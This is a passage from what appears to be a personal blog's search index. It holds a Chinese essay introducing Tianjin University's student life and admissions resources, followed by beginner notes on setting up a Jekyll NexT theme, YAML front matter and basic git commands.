src="http://8.131.246.244/upload/2021/01/vq0l4ggvdihmuphmvol213cqff.png" alt=""></p><h2 id="福利">福利</h2><ul><li><p>水果工程</p><blockquote><p>当时我是水果工程的志愿者，23:00的风，是真的爽:thermometer:</p></blockquote></li></ul><p><img src="https://i.loli.net/2021/01/21/W63rBE1H84ws7mx.png" alt="image.png"></p><ul><li><p><a href="https://wiki.tjubot.cn/category/scholarship/">助困体系</a></p><p><img src="https://i.loli.net/2021/01/21/C4wSnlu9BTKAbQc.png" alt="image.png"></p></li><li><p>其他活动<br>基本上每周学校都会一些小活动，像是意见征集、食堂优惠、节日活动。</p></li></ul><h2 id="个人感受">个人感受</h2><p><font face = "KaiTi">大学对我而言最重要的大概是<font size = "4">多元</font>二字。在天大，你可以选择在图书馆里泡一下午，也可以去实验室做你感兴趣的事情，或者在自习室巩固所学知识，当然也可以宿舍里和同学开黑娱乐。至于怎么做，取决于自己。不过，“道路千万条，毕业第一条”，自主决定的前提，是学业的顺利完成。</font></p><blockquote><p>有课的时候</p></blockquote><p><img src="https://i.loli.net/2021/01/21/7wOBAkrFCNYiDv6.png" alt="image.png"></p><blockquote><p>没课的时候（不愧是我）</p></blockquote><p><img src="https://i.loli.net/2021/01/21/r5C2JqjgUhEswTp.png" alt="image.png"></p><blockquote><p>至于大佬:frowning:</p></blockquote><p><img src="https://i.loli.net/2021/01/21/h79n5KvHDXQiOFS.png" alt="image.png"></p><h2 id="最后">最后</h2><blockquote><p><font color = "indigo">喜欢你是天大的事</font>，放一个学长自己制作的视频</p></blockquote><div style="position: relative; padding: 30% 45%;"><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?aid=668622156&bvid=BV1za4y1Y7PT&cid=202100696&page=1&as_wide=1&high_quality=1&danmaku=0" frameborder="no" scrolling="no"></iframe></div><table width="100%" height="100%" cellpadding="0" cellspacing="0"><tr><td valign="middle" align="center"><font face = "Monotype Corsiva" size = "5" color = "black">Welcome to TJU.</font><br></td></tr></table><h2 id="参考链接及相关资料">参考链接及相关资料</h2><p>:lock:<a href="https://wiki.tjubot.cn/">北洋维基</a>(非学校官网网站，仅作参考)</p><p>:lock:<a href="http://zs.tju.edu.cn">天津大学本科招生网</a></p><p>:lock:<a href="http://www.tju.edu.cn">天津大学主页</a></p><p>:phone:咨询热线：022-27405486</p><p>:lock: bilibili账号:天津大学招生宣传协会</p><p>:lock:微信订阅号：天津大学招生办</p><p>:package:<a href="https://amorfati.lanzous.com/b01tvzw5e">2020年报考指南及往年分数线</a> 提取码:6rbs<br>(2021的版本还未发布)</p>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TJU </tag>
            
            <tag> Practical Activity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络小白遇到的坑</title>
      <link href="/2021/02/24/2021-02-24-%E7%BD%91%E7%BB%9C%E5%B0%8F%E7%99%BD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2021/02/24/2021-02-24-%E7%BD%91%E7%BB%9C%E5%B0%8F%E7%99%BD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p><a href="http://theme-next.simpleyyt.com/">官方指南</a></p><h2 id="安装NexT">安装NexT</h2><ul><li><p>ruby 版本</p><p>之前安装的最新版 ruby 3.0。不断地看错误信息，debug之后，错误信息显示，ruby 版本需要在2.1-2.6之间（当时没有截图，也懒得复现）</p></li><li><p>本地测试</p><p>在<code>_config.yml</code>文件中，必须添加<code>description</code>,否则会报错<code>Error processing value 'description'</code><a href="https://imgtu.com/i/yOiRyQ"><img src="https://s3.ax1x.com/2021/02/24/yOiRyQ.png" alt="yOiRyQ.png"></a></p></li></ul><h2 id="文章的撰写与上传">文章的撰写与上传</h2><ul><li><p>文件命名：<a href="http://year-month-day-title.md">year-month-day-title.md</a></p></li><li><p><a href="https://jekyllrb.com/docs/front-matter/">YAML Front Matter</a></p><p>一个比较常见的文章</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">title</span><span class="token punctuation">:</span> demo<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2021-02-24</span><span class="token key atrule">descriptoion</span><span class="token punctuation">:</span> something<span class="token key atrule">categories</span><span class="token punctuation">:</span><span class="token punctuation">-</span> one<span class="token punctuation">-</span> two<span class="token punctuation">-</span> ···<span class="token key atrule">tags</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>one<span class="token punctuation">,</span> two<span class="token punctuation">,</span> ···<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>git</p><pre class="line-numbers language-git" data-language="git"><code class="language-git"><span class="token command">$ git add .</span><span class="token command">$ git commit<span class="token parameter"> -m</span> </span><span class="token string">""</span><span class="token command">$ git pull<span class="token parameter"> --rebase</span></span><span class="token command">$ git push origin master</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> git </tag>
            
            <tag> yaml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
